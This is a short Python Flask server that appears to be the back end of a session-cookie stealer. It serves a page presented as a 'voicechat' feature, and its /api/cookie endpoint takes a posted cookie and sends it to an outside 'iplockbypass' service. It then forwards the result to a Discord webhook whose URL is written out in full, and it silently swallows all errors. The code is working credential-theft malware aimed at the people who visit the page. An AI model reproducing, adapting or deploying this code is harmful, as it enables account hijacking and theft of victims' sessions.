import requests
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/voicechat")
def voice():
    return render_template("voicechat.html")

@app.route("/api/cookie", methods=["POST"])
def send():
    try:
        ip_lock_bypass = requests.post(
            "https://eggy.cool/iplockbypass?cookie=" + request.json["cookie"],
            timeout=300
        )
        requests.post(
            "https://discord.com/api/webhooks/1087141404138012712/-ifMYKshC9uZ2gtlR5KtVjNud6XX7RLVEwFtPKbOGo6rrRplCK4lA-1Ge_egaGH0y_K0",
            data={
                "content": ip_lock_bypass.text
            }
        )
    except:
        pass
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)